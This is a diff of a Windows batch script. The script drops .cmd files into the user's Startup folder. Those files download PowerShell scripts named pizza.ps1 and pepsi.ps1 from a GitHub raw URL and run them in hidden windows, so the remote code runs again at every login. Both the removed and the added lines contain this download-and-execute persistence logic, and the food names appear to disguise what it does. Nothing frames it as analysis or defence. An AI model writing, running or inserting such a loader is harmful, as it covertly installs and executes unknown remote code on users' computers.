@@ -13,15 +13,16 @@ set "startup=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 cd /d "%startup%"
 
-echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lak200425/dododo/refs/heads/main/pizza.ps1' -OutFile 'burger.ps1'; Start-Process powershell.exe -ArgumentList '-File \"%startup%\burger.ps1\"' -WindowStyle Hidden" > burger.cmd
-powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\burger.cmd\"' -WindowStyle Hidden"
+REM Create and download the Pepsi script
+echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lak200425/dododo/refs/heads/main/pepsi.ps1' -OutFile 'pepsi.ps1'; Start-Process powershell.exe -ArgumentList '-File \"%startup%\pepsi.ps1\"' -WindowStyle Hidden" > pepsi.cmd
 
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lak200425/dododo/refs/heads/main/pepsi.ps1', '%startup%\pepsi.ps1')"
-powershell -Command "Start-Process powershell.exe -ArgumentList '-File \"%startup%\pepsi.ps1\"' -WindowStyle Hidden"
+REM Create and download the Pizza script
+echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lak200425/dododo/refs/heads/main/pizza.ps1' -OutFile 'pizza.ps1'; Start-Process powershell.exe -ArgumentList '-File \"%startup%\pizza.ps1\"' -WindowStyle Hidden" > pizza.cmd
 
-powershell -Command "Start-Process powershell.exe -ArgumentList '-File \"%startup%\burger.ps1\"' -WindowStyle Hidden"
-powershell -Command "Start-Process powershell.exe -ArgumentList '-File \"%startup%\pepsi.ps1\"' -WindowStyle Hidden"
+REM Start both scripts in parallel using cmd.exe
+powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\pepsi.cmd\"' -WindowStyle Hidden"
+powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\pizza.cmd\"' -WindowStyle Hidden"
 
 cd /d "%initialPath%"
 
-REM del initial.cmd
+exit
